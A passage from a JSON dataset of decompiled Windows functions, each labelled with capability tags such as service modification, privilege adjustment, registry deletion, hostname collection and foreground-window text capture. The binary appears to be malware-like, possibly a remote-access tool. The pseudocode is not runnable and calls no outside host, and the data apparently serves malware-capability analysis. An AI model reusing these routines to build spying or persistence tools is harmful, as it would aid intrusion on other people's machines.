0x41a714, &pvarg, 0);\n            if ((iVar5 != 0) && (iVar5 = (**(*var_ch + 0xc))(var_ch, L\"FriendlyName\", &pvarg, 0),  iVar5 != 0)) break;\n            iVar5 = fcn.00406099();\n            if (iVar5 == 0) {\n                piVar4 = NULL;\n            }\n            else {\n                piVar4 = fcn.00414b6e();\n            }\n            iVar3 = *var_20h;\n            piVar1 = var_20h;\n            while (iVar3 != 0) {\n                *(piVar4[1] + iVar7 * 2) = iVar3;\n                uVar2 = *piVar1;\n                piVar1 = piVar1 + 1;\n                *(iVar7 + *piVar4) = uVar2;\n                iVar7 = iVar7 + 1;\n                iVar3 = *piVar1;\n            }\n            piVar4[2] = iVar6;\n            fcn.00402503(piVar4);\n            iVar6 = iVar6 + 1;\n        }\n        if (var_4h != NULL) {\n            (**(*var_4h + 8))(var_4h);\n            var_4h = NULL;\n        }\n        if (ppv != NULL) {\n            (**(*ppv + 8))(ppv);\n            ppv = NULL;\n        }\n        (*_sym.imp.ole32.dll_CoUninitialize)();\n    }\n    return;\n}\n",
        "token_count": 766
    },
    "00414b9a": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00414b9a(int32_t *param_1)\n\n{\n    uint32_t uVar1;\n    \n    fcn.00414c38(param_1);\n    uVar1 = 0;\n    if (param_1[3] != 0) {\n        do {\n            fcn.00405de9();\n            if (*(param_1[1] + uVar1 * 4) != 0) {\n                fcn.00414f0a();\n            }\n            uVar1 = uVar1 + 1;\n        } while (uVar1 < param_1[3]);\n    }\n    if (*param_1 != 0) {\n        fcn.00414603();\n    }\n    param_1[1] = 0;\n    param_1[3] = 0;\n    param_1[2] = 0;\n    return;\n}\n",
        "token_count": 196
    },
    "00414be6": {
        "rules": [
            "contain loop"
        ],
        "decompiled_code": "\nuint * __cdecl fcn.00414be6(uint *arg_8h)\n\n{\n    uint uVar1;\n    int32_t in_ECX;\n    uint32_t uVar2;\n    \n    uVar2 = 0;\n    arg_8h[3] = 5;\n    arg_8h[1] = 5;\n    arg_8h[2] = 0;\n    uVar1 = fcn.00406099();\n    *arg_8h = uVar1;\n    if (*(in_ECX + 0xc) != 0) {\n        do {\n            fcn.00405de9();\n            fcn.00402503(*(*(in_ECX + 4) + uVar2 * 4));\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < *(in_ECX + 0xc));\n    }\n    return arg_8h;\n}\n",
        "token_count": 201
    },
    "00402a0a": {
        "rules": [
            "check if file exists"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00402a0a(uint param_1, int32_t param_2)\n\n{\n    int32_t iVar1;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint *lpBuffer;\n    uint uVar2;\n    int32_t arg_8h;\n    uint arg_ch;\n    uint var_20h;\n    uint var_8h;\n    uint pszPath;\n    \n    iVar1 = param_2 + 8;\n    arg_8h = iVar1;\n    fcn.0040373f(iVar1);\n    fcn.00411722(arg_8h, arg_ch);\n    fcn.0040373f(iVar1);\n    iVar1 = (*_sym.imp.SHLWAPI.dll_PathFileExistsW)(pszPath);\n    fcn.00405feb();\n    if (iVar1 == 0) {\n        iVar1 = fcn.004116f0(extraout_ECX, extraout_ECX);\n    }\n    else {\n        iVar1 = fcn.004116b1(0x40000000);\n    }\n    if (iVar1 != 0) {\n        fcn.0040315e(param_2 + 0x14);\n        lpBuffer = &var_8h;\n        uVar2 = extraout_ECX_00;\n        fcn.0041165c(lpBuffer);\n        fcn.00403148(lpBuffer, uVar2);\n        fcn.00411644();\n    }\n    fcn.0041140c();\n    return;\n}\n",
        "token_count": 335
    },
    "00405de9": {
        "rules": [
            "terminate process",
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00405de9(char param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_LoadLibraryA)(\"USER32.DLL\");\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, 0x4178ac);\n    if (param_1 == '\\0') {\n        if (pcVar2 != NULL) {\n            (*pcVar2)(0, \"An assertion condition failed\", \"Assert\", 0x2010);\n        }\n        (*_sym.imp.KERNEL32.dll_ExitProcess)(1);\n    }\n    return;\n}\n",
        "token_count": 147
    },
    "00410c3e": {
        "rules": [
            "create directory"
        ],
        "decompiled_code": "\nbool __fastcall fcn.00410c3e(uint *param_1)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.SHELL32.dll_SHCreateDirectoryExW)(0, *param_1, 0);\n    return iVar1 == 0;\n}\n",
        "token_count": 64
    },
    "004048b7": {
        "rules": [
            "get graphical window text"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __cdecl fcn.004048b7(uint arg_8h)\n\n{\n    int32_t iVar1;\n    uint32_t arg_8h_00;\n    uint uVar2;\n    uint *puVar3;\n    uint var_224h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_ch;\n    int32_t var_8h;\n    uint var_4h;\n    \n    var_ch = 8;\n    (*_sym.imp.USER32.dll_GetLastInputInfo)(&var_ch);\n    iVar1 = (*_sym.imp.KERNEL32.dll_GetTickCount)();\n    arg_8h_00 = (iVar1 - var_8h) / 1000;\n    uVar2 = (*_sym.imp.USER32.dll_GetForegroundWindow)();\n    (*_sym.imp.USER32.dll_GetWindowTextW)(uVar2, &var_224h, 0x100);\n    fcn.004036f7(&var_224h);\n    var_20h = 0;\n    puVar3 = &var_4h;\n    var_24h = 0x15;\n    _var_1ch = ZEXT816(0);\n    uVar2 = arg_8h;\n    fcn.00403852(arg_8h_00);\n    fcn.00403873(arg_8h_00);\n    fcn.0040378b(arg_8h_00);\n    fcn.00403777(arg_8h_00, puVar3, uVar2);\n    fcn.00405feb();\n    return arg_8h;\n}\n",
        "token_count": 362
    },
    "0040f238": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040f238(uint arg_8h)\n\n{\n    uint uVar1;\n    \n    if ((*0x55adb8 == NULL) || (*0x55ad94 == NULL)) {\n        uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(0x419ab0);\n        *0x55adb8 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"RtlNtStatusToDosError\");\n        *0x55ad94 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1, \"RtlSetLastWin32Error\");\n    }\n    if ((*0x55adb8 != NULL) && (*0x55ad94 != NULL)) {\n        uVar1 = (**0x55adb8)(arg_8h);\n        (**0x55ad94)(uVar1);\n    }\n    return;\n}\n",
        "token_count": 195
    },
    "004121dc": {
        "rules": [
            "link function at runtime on Windows"
        ],
        "decompiled_code": "\nuint __fastcall fcn.004121dc(uint *param_1)\n\n{\n    uint uVar1;\n    code *pcVar2;\n    uint var_4h;\n    \n    var_4h = 0;\n    uVar1 = (*_sym.imp.KERNEL32.dll_GetModuleHandleA)(\"kernel32\", 0x419d10);\n    pcVar2 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar1);\n    if (pcVar2 != NULL) {\n        (*pcVar2)(*param_1, &var_4h);\n    }\n    return var_4h;\n}\n",
        "token_count": 131
    },
    "0041165c": {
        "rules": [
            "write file on Windows"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041165c(uint *lpBuffer)\n\n{\n    uint uVar1;\n    int32_t *in_ECX;\n    uint lpNumberOfBytesWritten;\n    \n    if (*in_ECX != 0) {\n        fcn.0041178e();\n    }\n    lpNumberOfBytesWritten = 0;\n    (*_sym.imp.KERNEL32.dll_SetFilePointer)(in_ECX[2], 0, 0, 2);\n    uVar1 = (*_sym.imp.KERNEL32.dll_WriteFile)(in_ECX[2], *lpBuffer, lpBuffer[1], &lpNumberOfBytesWritten, 0);\n    if (*in_ECX != 0) {\n        (*_sym.imp.KERNEL32.dll_ReleaseMutex)(in_ECX[3]);\n    }\n    return uVar1;\n}\n",
        "token_count": 177
    },
    "00412569": {
        "rules": [
            "query or enumerate registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00412569(uint *lpValueName, uint arg_ch)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint *in_ECX;\n    uint lpType;\n    uint lpcbData;\n    \n    lpcbData = 0;\n    lpType = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, 0, &lpcbData);\n    if (iVar1 == 0) {\n        iVar1 = fcn.00401085(lpcbData);\n        iVar2 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExW)(*in_ECX, *lpValueName, 0, &lpType, iVar1, &lpcbData);\n        if (iVar2 == 0) {\n            fcn.004030cc(iVar1, lpcbData);\n            if (iVar1 != 0) {\n                fcn.00401099(iVar1);\n            }\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 242
    },
    "0040d33c": {
        "rules": [
            "get service handle",
            "modify service"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040d33c(uint *lpServiceName, uint dwStartType)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    int32_t iVar5;\n    \n    uVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    uVar4 = uVar2;\n    if (uVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(uVar2, *lpServiceName, 2);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            uVar4 = 0;\n        }\n        else {\n            iVar5 = (*_sym.imp.ADVAPI32.dll_ChangeServiceConfigW)\n                              (iVar3, 0xffffffff, dwStartType, 0xffffffff, 0, 0, 0, 0, 0, 0, 0);\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            uVar4 = iVar5 != 0;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(uVar2);\n            (*pcVar1)(iVar3);\n        }\n    }\n    return uVar4;\n}\n",
        "token_count": 306
    },
    "0040d42d": {
        "rules": [
            "get service handle"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.0040d42d(uint *lpServiceName)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    uint pcbBytesNeeded;\n    \n    pcbBytesNeeded = 0;\n    iVar2 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar2 != 0) {\n        iVar3 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar2, *lpServiceName, 1);\n        if (iVar3 == 0) {\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        }\n        else {\n            iVar4 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, 0, 0, &pcbBytesNeeded);\n            if ((iVar4 != 0) || (iVar4 = (*_sym.imp.KERNEL32.dll_GetLastError)(),  iVar4 == 0x7a)) {\n                iVar4 = fcn.00406045();\n                iVar5 = (*_sym.imp.ADVAPI32.dll_QueryServiceConfigW)(iVar3, iVar4, pcbBytesNeeded, &pcbBytesNeeded);\n                pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n                if (iVar5 != 0) {\n                    iVar5 = *(iVar4 + 4);\n                    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n                    (*pcVar1)(iVar3);\n                    fcn.00401099(iVar4);\n                    return iVar5;\n                }\n            }\n            pcVar1 = _sym.imp.ADVAPI32.dll_CloseServiceHandle;\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n            (*pcVar1)(iVar3);\n        }\n        iVar2 = 0;\n    }\n    return iVar2;\n}\n",
        "token_count": 426
    },
    "0040efc1": {
        "rules": [
            "get service handle",
            "query service status"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040efc1(uint param_1, uint param_2)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint pcbBytesNeeded;\n    uint lpBuffer;\n    \n    uVar3 = 0;\n    lpBuffer = param_2;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenSCManagerW)(0, L\"ServicesActive\", 1);\n    if (iVar1 != 0) {\n        iVar2 = (*_sym.imp.ADVAPI32.dll_OpenServiceW)(iVar1, L\"TermService\", 4);\n        if (iVar2 != 0) {\n            uVar3 = (*_sym.imp.ADVAPI32.dll_QueryServiceStatusEx)(iVar2, 0, lpBuffer, 0x24, &pcbBytesNeeded);\n            (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar2);\n        }\n        (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    }\n    return uVar3;\n}\n",
        "token_count": 230
    },
    "004125df": {
        "rules": [
            "set registry value"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004125df(uint *arg_8h, uint *arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    int32_t *in_ECX;\n    \n    if ((*in_ECX != 0) &&\n       (iVar1 = (*_sym.imp.ADVAPI32.dll_RegSetValueExW)(*in_ECX, *arg_8h, 0, arg_10h, *arg_ch, arg_ch[1]),  iVar1 == 0))\n    {\n        return 1;\n    }\n    return 0;\n}\n",
        "token_count": 125
    },
    "00410b38": {
        "rules": [
            "modify access privileges"
        ],
        "decompiled_code": "\nuint __fastcall fcn.00410b38(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    uint PreviousState;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint NewState;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint lpLuid;\n    uint var_ch;\n    uint ReturnLength;\n    uint TokenHandle;\n    \n    PreviousState = 0;\n    TokenHandle = 0;\n    _lpLuid = 0;\n    ReturnLength = 0;\n    uStack48 = 0;\n    uStack44 = 0;\n    uStack40 = 0;\n    iVar1 = (*_sym.imp.ADVAPI32.dll_OpenProcessToken)(param_1, 0x28, &TokenHandle);\n    if ((iVar1 != 0) && (iVar1 = (*_sym.imp.ADVAPI32.dll_LookupPrivilegeValueW)(0, *param_2, &lpLuid),  iVar1 != 0)) {\n        var_1ch = lpLuid;\n        var_18h = var_ch;\n        NewState = 1;\n        var_14h = 2;\n        iVar1 = (*_sym.imp.ADVAPI32.dll_AdjustTokenPrivileges)\n                          (TokenHandle, 0, &NewState, 0x10, &PreviousState, &ReturnLength);\n        if (iVar1 != 0) {\n            return 1;\n        }\n    }\n    return 0;\n}\n",
        "token_count": 339
    },
    "00410f3e": {
        "rules": [
            "get memory capacity"
        ],
        "decompiled_code": "\nuint32_t fcn.00410f3e(void)\n\n{\n    uint lpBuffer;\n    uint32_t var_38h;\n    int32_t var_34h;\n    \n    lpBuffer = 0x40;\n    (*_sym.imp.KERNEL32.dll_GlobalMemoryStatusEx)(&lpBuffer);\n    return var_38h >> 0x14 | var_34h << 0xc;\n}\n",
        "token_count": 88
    },
    "0041119d": {
        "rules": [
            "get hostname"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0041119d(uint param_1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint lpBuffer;\n    uint nSize;\n    \n    nSize = 0x10;\n    puVar2 = &lpBuffer;\n    for (iVar1 = 8; iVar1 != 0; iVar1 = iVar1 + -1) {\n        *puVar2 = 0;\n        puVar2 = puVar2 + 1;\n    }\n    (*_sym.imp.KERNEL32.dll_GetComputerNameW)(&lpBuffer, &nSize);\n    fcn.004036f7(&lpBuffer);\n    return param_1;\n}\n",
        "token_count": 149
    },
    "0041142a": {
        "rules": [
            "delete file"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0041142a(uint lpFileName)\n\n{\n    uint uVar1;\n    \n    uVar1 = (*_sym.imp.KERNEL32.dll_DeleteFileW)(lpFileName);\n    fcn.00405feb();\n    return uVar1;\n}\n",
        "token_count": 58
    },
    "004124d7": {
        "rules": [
            "delete registry key"
        ],
        "decompiled_code": "\nbool __fastcall fcn.004124d7(uint param_1, uint *param_2)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegDeleteKeyW)(0x80000001, *param_2);\n    return iVar1 == 0;\n}\n",
        "token_count": 69
    }
}